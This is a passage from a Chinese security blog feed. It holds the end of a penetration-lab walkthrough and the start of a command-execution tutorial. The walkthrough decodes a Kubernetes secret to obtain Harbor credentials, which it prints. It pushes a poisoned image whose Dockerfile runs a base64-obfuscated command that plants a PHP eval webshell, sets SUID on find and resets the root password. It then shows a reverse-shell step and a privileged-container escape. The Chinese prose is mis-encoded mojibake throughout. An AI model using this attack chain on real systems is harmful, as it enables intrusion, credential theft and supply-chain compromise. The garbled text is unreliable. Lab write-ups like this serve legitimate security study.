overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        <span class="attribute">TX</span> packets <span class="number">219473</span>  bytes <span class="number">114617018</span> (<span class="number">109</span>.<span class="number">3</span> MiB)</span><br><span class="line">        <span class="attribute">TX</span> errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">eth1</span>: flags=<span class="number">4163</span>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="number">1500</span></span><br><span class="line">        <span class="attribute">inet</span> <span class="number">172.22.50.75</span>  netmask <span class="number">255.255.0.0</span>  broadcast <span class="number">172.22.255.255</span></span><br><span class="line">        <span class="attribute">inet6</span> fe80::<span class="number">216</span>:<span class="number">3</span>eff:fe18:<span class="number">6372</span>  prefixlen <span class="number">64</span>  scopeid <span class="number">0</span>x20&lt;link&gt;</span><br><span class="line">        <span class="attribute">ether</span> <span class="number">00</span>:<span class="number">16</span>:<span class="number">3</span>e:<span class="number">18</span>:<span class="number">63</span>:<span class="number">72</span>  txqueuelen <span class="number">1000</span>  (Ethernet)</span><br><span class="line">        <span class="attribute">RX</span> packets <span class="number">1149</span>  bytes <span class="number">83330</span> (<span class="number">81</span>.<span class="number">3</span> KiB)</span><br><span class="line">        <span class="attribute">RX</span> errors <span class="number">0</span>  dropped <span class="number">0</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        <span class="attribute">TX</span> packets <span class="number">1118</span>  bytes <span class="number">94102</span> (<span class="number">91</span>.<span class="number">8</span> KiB)</span><br><span class="line">        <span class="attribute">TX</span> errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br></pre></td></tr></table></figure><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">172.22.50.45:22</span> open</span><br><span class="line"><span class="number">172.22.50.75:22</span> open</span><br><span class="line"><span class="number">172.22.50.45:80</span> open</span><br><span class="line"><span class="number">172.22.50.75:111</span> open</span><br><span class="line"><span class="number">172.22.50.75:179</span> open</span><br><span class="line"><span class="number">172.22.50.75:5000</span> open</span><br><span class="line"><span class="number">172.22.50.75:9253</span> open</span><br><span class="line"><span class="number">172.22.50.75:9353</span> open</span><br><span class="line"><span class="number">172.22.50.75:10000</span> open</span><br><span class="line"><span class="number">172.22.50.75:10249</span> open</span><br><span class="line"><span class="number">172.22.50.75:10248</span> open</span><br><span class="line"><span class="number">172.22.50.75:10259</span> open</span><br><span class="line"><span class="number">172.22.50.75:10257</span> open</span><br><span class="line"><span class="number">172.22.50.75:10256</span> open</span><br><span class="line"><span class="number">172.22.50.75:10250</span> open</span><br><span class="line"><span class="number">172.22.50.75:30020</span> open</span><br><span class="line"><span class="number">172.22.50.75:32686</span> open</span><br><span class="line"><span class="string">[*]</span> alive ports len is: <span class="number">17</span></span><br><span class="line">start vulscan</span><br><span class="line"><span class="string">[*]</span> WebTitle: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">50</span>.<span class="number">45</span>       code:<span class="number">403</span> len:<span class="number">277</span>    title:<span class="number">403</span> Forbidden</span><br><span class="line"><span class="string">[*]</span> WebTitle: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">50</span>.<span class="number">75</span>:<span class="number">10249</span> code:<span class="number">404</span> len:<span class="number">19</span>     title:None</span><br><span class="line"><span class="string">[*]</span> WebTitle: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">50</span>.<span class="number">75</span>:<span class="number">5000</span>  code:<span class="number">200</span> len:<span class="number">0</span>      title:None</span><br><span class="line"><span class="string">[*]</span> WebTitle: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">50</span>.<span class="number">75</span>:<span class="number">10248</span> code:<span class="number">404</span> len:<span class="number">19</span>     title:None</span><br><span class="line"><span class="string">[*]</span> WebTitle: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">50</span>.<span class="number">75</span>:<span class="number">10000</span> code:<span class="number">400</span> len:<span class="number">0</span>      title:None</span><br><span class="line"><span class="string">[*]</span> WebTitle: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">50</span>.<span class="number">75</span>:<span class="number">9253</span>  code:<span class="number">404</span> len:<span class="number">19</span>     title:None</span><br><span class="line"><span class="string">[*]</span> WebTitle: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">50</span>.<span class="number">75</span>:<span class="number">9353</span>  code:<span class="number">404</span> len:<span class="number">19</span>     title:None</span><br><span class="line"><span class="string">[*]</span> WebTitle: https://<span class="number">172</span>.<span class="number">22</span>.<span class="number">50</span>.<span class="number">75</span>:<span class="number">32686</span> code:<span class="number">200</span> len:<span class="number">1422</span>   title:Kubernetes Dashboard</span><br><span class="line"><span class="string">[*]</span> WebTitle: https://<span class="number">172</span>.<span class="number">22</span>.<span class="number">50</span>.<span class="number">75</span>:<span class="number">10250</span> code:<span class="number">404</span> len:<span class="number">19</span>     title:None</span><br><span class="line"><span class="string">[*]</span> WebTitle: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">50</span>.<span class="number">75</span>:<span class="number">10256</span> code:<span class="number">404</span> len:<span class="number">19</span>     title:None</span><br><span class="line"><span class="string">[*]</span> WebTitle: https://<span class="number">172</span>.<span class="number">22</span>.<span class="number">50</span>.<span class="number">75</span>:<span class="number">10259</span> code:<span class="number">403</span> len:<span class="number">217</span>    title:None</span><br><span class="line"><span class="string">[*]</span> WebTitle: https://<span class="number">172</span>.<span class="number">22</span>.<span class="number">50</span>.<span class="number">75</span>:<span class="number">10257</span> code:<span class="number">403</span> len:<span class="number">217</span>    title:None</span><br><span class="line"><span class="string">[+]</span> InfoScan:https://<span class="number">172</span>.<span class="number">22</span>.<span class="number">50</span>.<span class="number">75</span>:<span class="number">32686</span> <span class="string">[Kubernetes]</span> </span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰å±‚ä»£ç†socks5://172.22.15.75:10000ï¼Œä¿¡æ¯æ”¶é›†å‘ç°æœ‰ä¸€ä¸ªsecrets</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@master ~]# kubectl get secrets harbor-registry-secret</span><br><span class="line">NAME                     TYPE                             DATA   AGE</span><br><span class="line">harbor-registry-secret   kubernetes.io/dockerconfigjson   1      115d</span><br><span class="line"></span><br><span class="line">[root@master ~]# kubectl describe secret harbor-registry-secret</span><br><span class="line">Name:         harbor-registry-secret</span><br><span class="line">Namespace:    default</span><br><span class="line">Labels:       &lt;none&gt;</span><br><span class="line">Annotations:  &lt;none&gt;</span><br><span class="line"></span><br><span class="line">Type:  kubernetes.io/dockerconfigjson</span><br><span class="line"></span><br><span class="line"><span class="section">Data</span></span><br><span class="line"><span class="section">====</span></span><br><span class="line"><span class="title">.dockerconfigjson:  121 bytes</span></span><br></pre></td></tr></table></figure><p>è§£ç è·å–å…¶å†…å®¹</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@master ~]# kubectl <span class="built_in">get</span><span class="built_in"> secret </span>harbor-registry-secret -o <span class="attribute">jsonpath</span>=<span class="string">&#x27;&#123;.data.\.dockerconfigjson&#125;&#x27;</span> | base64 --decode</span><br><span class="line">&#123;<span class="string">&quot;auths&quot;</span>:&#123;<span class="string">&quot;172.22.18.64&quot;</span>:&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;password@nk9DLwqce&quot;</span>,<span class="string">&quot;auth&quot;</span>:<span class="string">&quot;YWRtaW46cGFzc3dvcmRAbms5REx3cWNl&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>å°è¯•ç™»å½•harborï¼Œå‘ç°ç§æœ‰é•œåƒ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20241222033525231.png" alt="image-20241222033525231"></p><p>ç™»å½•ï¼Œç„¶åæ‹‰å–å³å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker login 172.22.18.64</span><br><span class="line">docker pull 172.22.18.64/hospital/flag:latest</span><br><span class="line">docker run -<span class="built_in">id</span> --name flag 172.22.18.64/hospital/flag</span><br><span class="line">docker <span class="built_in">exec</span> -it flag /bin/bash</span><br><span class="line"><span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure><h2 id="flag8">flag8</h2><p>è¿™é‡Œå‚è€ƒäº†å¤§å¤´å¸ˆå‚…çš„wpï¼Œè§‚å¯Ÿharborçš„æ—¥å¿—å¯ä»¥å‘ç°æœ‰ä¸€ä¸ªä¸»æœºä¼šå›ºå®šæ—¶é—´æ‹‰é•œåƒï¼Œæˆ‘ä»¬æŠŠé•œåƒä¸‹è½½ä¸‹æ¥ï¼Œå‘ç°æœ‰ä¸€ä¸ªp.phpï¼Œç„¶åhttp://172.22.50.45è¿™ä¸ªç½‘ç«™ä¹Ÿæœ‰æ­¤æ–‡ä»¶ï¼Œæ‰€ä»¥åŸºæœ¬å¯ä»¥æ–­å®šä¸ºæ­¤é•œåƒï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è‡ªæ„å»ºä¸€ä¸ªåŒåé•œåƒpushä¸Šå»ï¼Œè®©å…¶åŠ è½½æˆ‘ä»¬çš„æ¶æ„é•œåƒ</p><p>å…ˆæ‹‰å–é•œåƒ</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> login <span class="number">172.22.18.64</span> <span class="comment">#è¾“å…¥è´¦å·å¯†ç </span></span><br><span class="line"></span><br><span class="line">docker pull <span class="number">172.22.18.64</span>/hospital/flag:latest</span><br></pre></td></tr></table></figure><p>Dockerfileå¦‚ä¸‹</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> <span class="number">172.22</span>.<span class="number">18.64</span>/hospital/system</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+JyA+IC92YXIvd3d3L2h0bWwvc2hlbGwucGhwICYmIGNobW9kIHUrcyAvdXNyL2Jpbi9maW5k | <span class="built_in">base64</span> -d | bash &amp;&amp; <span class="built_in">echo</span> password | <span class="built_in">echo</span> ZWNobyAicm9vdDpwYXNzd29yZCIgfCBjaHBhc3N3ZA== | <span class="built_in">base64</span> -d | bash</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;/usr/sbin/apache2ctl&quot;</span>, <span class="string">&quot;-D&quot;</span>, <span class="string">&quot;FOREGROUND&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>ç„¶åæ„å»ºå¥½é•œåƒï¼Œpushä¸Šå»ï¼Œç­‰å¾…20åˆ†é’Ÿä¸€æ¬¡çš„é‡æ–°æ‹‰å–</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker docker pull <span class="number">172.22</span>.<span class="number">18.64</span><span class="regexp">/hospital/</span>system</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†åå¼¹shellå‘½ä»¤å†™åˆ°æ–‡ä»¶é‡Œï¼Œç„¶ååˆ©ç”¨findåå¼¹shellï¼Œè¿™é‡Œæ˜¯åˆ©ç”¨masterèŠ‚ç‚¹æ¥æ”¶çš„shellï¼Œéœ€è¦è‡ªå·±ä¸Šä¼ ä¸€ä¸ªnc</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>bin<span class="regexp">/find ./</span> -exec ./<span class="number">1</span>.sh \;</span><br></pre></td></tr></table></figure><p>suå‘½ä»¤åˆ‡æ¢ç”¨æˆ·</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20241222033641806.png" alt="image-20241222033641806"></p><p>æŸ¥çœ‹å®¹å™¨æƒé™</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="regexp">/proc/</span>self/status | <span class="keyword">grep</span> CapEff</span><br><span class="line">CapEff: <span class="number">0000003</span>fffffffff</span><br><span class="line">#ç‰¹æƒé€ƒé€¸ä¸€ä»¶å¥—</span><br><span class="line">df -h</span><br><span class="line">Filesystem      <span class="keyword">Size</span>  Used Avail Use% Mounted on</span><br><span class="line">overlay          <span class="number">40</span>G  <span class="number">4.3</span>G   <span class="number">33</span>G  <span class="number">12</span>% /</span><br><span class="line">tmpfs            <span class="number">64</span>M     <span class="number">0</span>   <span class="number">64</span>M   <span class="number">0</span>% /dev</span><br><span class="line">tmpfs           <span class="number">1.9</span>G     <span class="number">0</span>  <span class="number">1.9</span>G   <span class="number">0</span>% <span class="regexp">/sys/</span>fs/cgroup</span><br><span class="line">shm              <span class="number">64</span>M     <span class="number">0</span>   <span class="number">64</span>M   <span class="number">0</span>% <span class="regexp">/dev/</span>shm</span><br><span class="line"><span class="regexp">/dev/</span>vda3        <span class="number">40</span>G  <span class="number">4.3</span>G   <span class="number">33</span>G  <span class="number">12</span>% <span class="regexp">/etc/</span>hosts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mkdir <span class="regexp">/test &amp;&amp; mount /</span>dev<span class="regexp">/vda3 /</span>test</span><br><span class="line">cat <span class="regexp">/test/</span>f*</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>å‘½ä»¤æ‰§è¡Œæ€»ç»“</title>
    <link href="https://bowuchuling.github.io/posts/1837iuw8.html"/>
    <id>https://bowuchuling.github.io/posts/1837iuw8.html</id>
    <published>2024-12-23T15:14:17.824Z</published>
    <updated>2024-12-23T17:01:25.059Z</updated>
    
    <content type="html"><![CDATA[<h1>å‘½ä»¤æ‰§è¡Œ</h1><h2 id="ASCIIç è¡¨å®Œæ•´ç‰ˆ">ASCIIç è¡¨å®Œæ•´ç‰ˆ</h2><table><thead><tr><th>ASCIIå€¼</th><th>æ§åˆ¶å­—ç¬¦</th><th>ASCIIå€¼</th><th>æ§åˆ¶å­—ç¬¦</th><th>ASCIIå€¼</th><th>æ§åˆ¶å­—ç¬¦</th><th>ASCIIå€¼</th><th>æ§åˆ¶å­—ç¬¦</th></tr></thead><tbody><tr><td>0</td><td>NUT</td><td>32</td><td>(space)</td><td>64</td><td>@</td><td>96</td><td>ã€</td></tr><tr><td>1</td><td>SOH</td><td>33</td><td>!</td><td>65</td><td>A</td><td>97</td><td>a</td></tr><tr><td>2</td><td>STX</td><td>34</td><td>â€</td><td>66</td><td>B</td><td>98</td><td>b</td></tr><tr><td>3</td><td>ETX</td><td>35</td><td>#</td><td>67</td><td>C</td><td>99</td><td>c</td></tr><tr><td>4</td><td>EOT</td><td>36</td><td>$</td><td>68</td><td>D</td><td>100</td><td>d</td></tr><tr><td>5</td><td>ENQ</td><td>37</td><td>%</td><td>69</td><td>E</td><td>101</td><td>e</td></tr><tr><td>6</td><td>ACK</td><td>38</td><td>&amp;</td><td>70</td><td>F</td><td>102</td><td>f</td></tr><tr><td>7</td><td>BEL</td><td>39</td><td>,</td><td>71</td><td>G</td><td>103</td><td>g</td></tr><tr><td>8</td><td>BS</td><td>40</td><td>(</td><td>72</td><td>H</td><td>104</td><td>h</td></tr><tr><td>9</td><td>HT</td><td>41</td><td>)</td><td>73</td><td>I</td><td>105</td><td>i</td></tr><tr><td>10</td><td>LF</td><td>42</td><td>*</td><td>74</td><td>J</td><td>106</td><td>j</td></tr><tr><td>11</td><td>VT</td><td>43</td><td>+</td><td>75</td><td>K</td><td>107</td><td>k</td></tr><tr><td>12</td><td>FF</td><td>44</td><td>,</td><td>76</td><td>L</td><td>108</td><td>l</td></tr><tr><td>13</td><td>CR</td><td>45</td><td>-</td><td>77</td><td>M</td><td>109</td><td>m</td></tr><tr><td>14</td><td>SO</td><td>46</td><td>.</td><td>78</td><td>N</td><td>110</td><td>n</td></tr><tr><td>15</td><td>SI</td><td>47</td><td>/</td><td>79</td><td>O</td><td>111</td><td>o</td></tr><tr><td>16</td><td>DLE</td><td>48</td><td>0</td><td>80</td><td>P</td><td>112</td><td>p</td></tr><tr><td>17</td><td>DCI</td><td>49</td><td>1</td><td>81</td><td>Q</td><td>113</td><td>q</td></tr><tr><td>18</td><td>DC2</td><td>50</td><td>2</td><td>82</td><td>R</td><td>114</td><td>r</td></tr><tr><td>19</td><td>DC3</td><td>51</td><td>3</td><td>83</td><td>X</td><td>115</td><td>s</td></tr><tr><td>20</td><td>DC4</td><td>52</td><td>4</td><td>84</td><td>T</td><td>116</td><td>t</td></tr><tr><td>21</td><td>NAK</td><td>53</td><td>5</td><td>85</td><td>U</td><td>117</td><td>u</td></tr><tr><td>22</td><td>SYN</td><td>54</td><td>6</td><td>86</td><td>V</td><td>118</td><td>v</td></tr><tr><td>23</td><td>TB</td><td>55</td><td>7</td><td>87</td><td>W</td><td>119</td><td>w</td></tr><tr><td>24</td><td>CAN</td><td>56</td><td>8</td><td>88</td><td>X</td><td>120</td><td>x</td></tr><tr><td>25</td><td>EM</td><td>57</td><td>9</td><td>89</td><td>Y</td><td>121</td><td>y</td></tr><tr><td>26</td><td>SUB</td><td>58</td><td>:</td><td>90</td><td>Z</td><td>122</td><td>z</td></tr><tr><td>27</td><td>ESC</td><td>59</td><td>;</td><td>91</td><td>[</td><td>123</td><td>{</td></tr><tr><td>28</td><td>FS</td><td>60</td><td>&lt;</td><td>92</td><td>/</td><td>124</td><td>|</td></tr><tr><td>29</td><td>GS</td><td>61</td><td>=</td><td>93</td><td>]</td><td>125</td><td>}</td></tr><tr><td>30</td><td>RS</td><td>62</td><td>&gt;</td><td>94</td><td>^</td><td>126</td><td>~</td></tr><tr><td>31</td><td>US</td><td>63</td><td>?</td><td>95</td><td>â€”</td><td>127</td><td>DEL</td></tr></tbody></table><h2 id="ç³»ç»Ÿå‘½ä»¤ç®€ä»‹">ç³»ç»Ÿå‘½ä»¤ç®€ä»‹</h2><p>ç³»ç»Ÿå‘½ä»¤ï¼Œç®€å•è§£é‡Šå°±æ˜¯åœ¨ç³»ç»Ÿç»ˆç«¯å¯æ‰§è¡Œçš„é¢„å®šä¹‰å‘½ä»¤ï¼Œå°±æ˜¯å¤§å®¶å¸¸è§çš„é»‘æ¡†æ¡†ã€‚åœ¨linuxæ“ä½œç³»ç»Ÿä¸­ï¼Œé¢„å®šä¹‰å‘½ä»¤é»˜è®¤å­˜å‚¨ä½ç½®ä¸º/binç›®å½•ï¼Œè€Œwindowsæ“ä½œç³»ç»Ÿçš„é¢„å®šä¹‰å‘½ä»¤é»˜è®¤å­˜å‚¨ä½ç½®ä¸ºC:\Windows\System32ï¼Œä¸‹é¢å°†é’ˆå¯¹linuxå’Œwinçš„ç³»ç»Ÿå‘½ä»¤åšç®€å•ä»‹ç»ã€‚</p><h3 id="ç®¡é“ç¬¦">ç®¡é“ç¬¦</h3><p>åœ¨winå’Œlinuxè¿™ä¸¤ç§æ“ä½œç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç®¡é“ç¬¦æ¥åŒæ—¶æ‰§è¡Œå¤šæ¡å‘½ä»¤</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">windowsï¼š</span><br><span class="line">â€˜<span class="string">|â€™ ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥</span></span><br><span class="line">â€˜<span class="string">||â€™ å¦‚æœå‰é¢å‘½ä»¤æ˜¯é”™çš„é‚£ä¹ˆå°±æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå¦åˆ™åªæ‰§è¡Œå‰é¢çš„è¯­å¥</span></span><br><span class="line">â€˜<span class="meta">&amp;â€™ å‰é¢å’Œåé¢å‘½ä»¤éƒ½è¦æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡</span></span><br><span class="line"><span class="meta">&amp;&amp;å¦‚æœå‰é¢ä¸ºå‡ï¼Œåé¢çš„å‘½ä»¤ä¹Ÿä¸æ‰§è¡Œï¼Œå¦‚æœå‰é¢ä¸ºçœŸåˆ™æ‰§è¡Œä¸¤æ¡å‘½ä»¤</span></span><br><span class="line"></span><br><span class="line">linuxï¼š</span><br><span class="line">Linuxç³»ç»ŸåŒ…å«äº†windowsç³»ç»Ÿä¸Šé¢å››ä¸ªä¹‹å¤–ï¼Œè¿˜å¤šäº†ä¸€ä¸ª â€˜;â€™ è¿™ä¸ªä½œç”¨å’Œ â€˜<span class="meta">&amp;â€™ ä½œç”¨ç›¸åŒ</span></span><br></pre></td></tr></table></figure><h3 id="é€šé…ç¬¦">é€šé…ç¬¦</h3><p>åœ¨linuxæ“ä½œç³»ç»Ÿä¸­æ”¯æŒå¦‚ä¸‹ä¸¤ç§é€šé…ç¬¦</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?   å¯ä»£æ›¿ä»»æ„ä¸€ä¸ªå­—ç¬¦</span><br><span class="line"><span class="bullet">*   </span>å¯ä»£æ›¿0-ä»»æ„ä¸ªå­—ç¬¦</span><br></pre></td></tr></table></figure><p><strong>ä¾‹</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è‹¥å½“å‰ç›®å½•åªå­˜åœ¨ä¸€ä¸ªåä¸ºflagçš„æ–‡ä»¶</span><br><span class="line"><span class="built_in">cat</span> flag &lt;==&gt; <span class="built_in">cat</span> fla?  &lt;==&gt;  <span class="built_in">cat</span> f*</span><br></pre></td></tr></table></figure><h3 id="é‡å®šå‘">é‡å®šå‘</h3><p>åœ¨linuxæ“ä½œç³»ç»Ÿä¸­ä¸€å…±æœ‰&gt;å’Œ&gt;&gt;ä¸¤ä¸ªé‡å®šå‘ç¬¦å·</p><p><strong>1.&gt;ç¬¦å·</strong></p><p>ç”¨äºå°†å‘½ä»¤çš„æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°æŒ‡å®šçš„æ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™ä¼šåˆ›å»ºæ–‡ä»¶ï¼›å¦‚æœæ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œåˆ™ä¼šè¦†ç›–æ–‡ä»¶å†…å®¹ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ls</span> &gt; <span class="keyword">file</span>.txt    //å°†<span class="keyword">ls</span>çš„æ‰§è¡Œç»“æœå†™å…¥<span class="keyword">file</span>.txtä¸­</span><br><span class="line">&gt;<span class="keyword">file</span>.txt        //åˆ›å»ºåä¸º<span class="keyword">file</span>.txtçš„æ–‡ä»¶</span><br></pre></td></tr></table></figure><p><strong>2.&gt;&gt;ç¬¦å·</strong></p><p>å°†å‘½ä»¤çš„æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°æŒ‡å®šçš„æ–‡ä»¶ï¼Œä½†ä¸<code>&gt;</code> ä¸åŒçš„æ˜¯ï¼Œå¦‚æœæ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œ<code>&gt;&gt;</code> ä¼šå°†è¾“å‡ºè¿½åŠ åˆ°æ–‡ä»¶æœ«å°¾è€Œä¸æ˜¯è¦†ç›–æ–‡ä»¶å†…å®¹ã€‚</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ls</span> &gt;&gt; <span class="keyword">file</span>.txt</span><br></pre></td></tr></table></figure><h3 id="å¸¸è§ç³»ç»Ÿå‘½ä»¤">å¸¸è§ç³»ç»Ÿå‘½ä»¤</h3><p>åœ¨é«˜çº§è¯­è¨€å½“ä¸­ï¼Œç³»ç»Ÿå‘½ä»¤é€šå¸¸éœ€è¦ç‰¹å®šçš„å‡½æ•°æ‰èƒ½æ‰§è¡Œã€‚ä¾‹å¦‚phpä¸­çš„</p><table><thead><tr><th style="text-align:center">system()</th></tr></thead><tbody><tr><td style="text-align:center">passthru()</td></tr><tr><td style="text-align:center">exec()</td></tr><tr><td style="text-align:center">shell_exec()</td></tr><tr><td style="text-align:center">popen()</td></tr><tr><td style="text-align:center">proc_open()</td></tr><tr><td style="text-align:center">pcntl_exec()</td></tr><tr><td style="text-align:center">``</td></tr></tbody></table><p>pythonä¸­çš„ä¾‹å¦‚ç­‰</p><table><thead><tr><th style="text-align:center">os.system()</th></tr></thead></table><p>æ ¹æ®å‡½æ•°ä¸åŒï¼Œå…¶æ‰€éœ€å‚æ•°ä»¥åŠå›æ˜¾æƒ…å†µç­‰éƒ½ä¼šç•¥æœ‰ä¸åŒï¼Œéœ€è¦æ ¹æ®å®é™…æƒ…å†µè¿›è¡Œè°ƒæ•´</p><h4 id="windows">windows</h4><table><thead><tr><th>å‘½ä»¤</th><th>å®é™…æ•ˆæœ</th></tr></thead><tbody><tr><td>ipconfig</td><td>ä¸»è¦ç”¨æ¥æŸ¥çœ‹å½“å‰æœºå™¨å†…ã€å¤–ç½‘ip</td></tr><tr><td>type</td><td>type filename æŸ¥çœ‹æ–‡ä»¶å†…å®¹</td></tr><tr><td>cd</td><td>ç›®å½•è·³è½¬</td></tr><tr><td>ping</td><td>ping ipæˆ–è€…url ä¸»è¦ç”¨æ¥åˆ¤æ–­æŸæœºå™¨æ˜¯å¦å¯è¾¾</td></tr><tr><td>dir</td><td>åˆ—å‡ºå½“å‰ç›®å½•</td></tr><tr><td>whoami</td><td>æŸ¥çœ‹å½“å‰ç”¨æˆ·ï¼Œä¸»è¦ç”¨äºåˆ¤æ–­æ˜¯å¦å¯ä»¥å‘½ä»¤æ‰§è¡Œ</td></tr></tbody></table><h4 id="linux">linux</h4><p><strong>åŸºç¡€å‘½ä»¤</strong></p><table><thead><tr><th>å‘½ä»¤</th><th>å®é™…æ•ˆæœ</th></tr></thead><tbody><tr><td>ls</td><td>åˆ—å‡ºå½“å‰ç›®å½•</td></tr><tr><td>cd</td><td>ç›®å½•è·³è½¬</td></tr><tr><td>rm</td><td>åˆ é™¤</td></tr><tr><td>mv</td><td>é‡å‘½å</td></tr><tr><td>whoami</td><td>æŸ¥çœ‹å½“å‰ç”¨æˆ·</td></tr><tr><td>uname -a</td><td>åˆ—å‡ºå†…æ ¸ç‰ˆæœ¬ç­‰è¯¦ç»†ç³»ç»Ÿè®¯æ¯</td></tr><tr><td>ifconfig</td><td>æŸ¥çœ‹å½“å‰æœºå™¨å†…å¤–ç½‘ip</td></tr><tr><td>ping</td><td>åˆ¤æ–­ç›®æ 